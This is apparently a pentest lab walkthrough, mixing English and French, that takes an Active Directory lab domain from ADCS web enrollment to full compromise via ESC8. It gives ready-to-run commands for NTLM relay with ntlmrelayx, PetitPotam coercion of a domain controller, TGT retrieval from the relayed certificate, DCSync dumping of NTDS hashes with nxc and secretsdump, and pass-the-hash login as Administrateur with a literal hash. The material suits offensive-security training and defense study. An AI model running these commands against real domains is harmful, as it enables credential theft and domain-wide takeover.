# ADCS

## ESC8 - coerce to domain admin

Pré-requis :

* ADCS running on the domain with web enrollment enabled.
* A working coerce method (here we use petitpotam unauthent, but an authenticated printerbug or other coerce methods will work the same)
* There is a useful template to exploit ESC8, by default on an active directory, its name is _DomainController_

Let’s check if the web enrollement is up and running at : http://192.168.56.23/certsrv/certfnsh.asp

Add a listener to relay SMB authentication to HTTP with impacket ntlmrelayx

```bash
ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Launch the coerce with petitpotam unauthenticated (this will no more work on an up to date active directory but other coerce methods authenticated will work the same). ntlmrelayx will relay the authentication to the web enrollement and get the certificate

```bash
python PetitPotam.py <LOCAL_IP> <SRV_IP_TO_COERCE>
```

Ask for a TGT with the certificate we just get

```bash
python gettgtpkinit.py -cert-pfx MACHINE\$.pfx domain.com/machine$ 'machine.ccache'
```

And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/machine.ccache
nxc smb meereen.essos.local -k --use-kcache
nxc smb meereen.essos.local -k --use-kcache --ntds
secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

Se connecter avec pass-the-hash

```bash
nxc smb meereen.essos.local -u 'Administrateur' -H '4dcaa3baa4c8eddca29e2793490fc9b8'
```
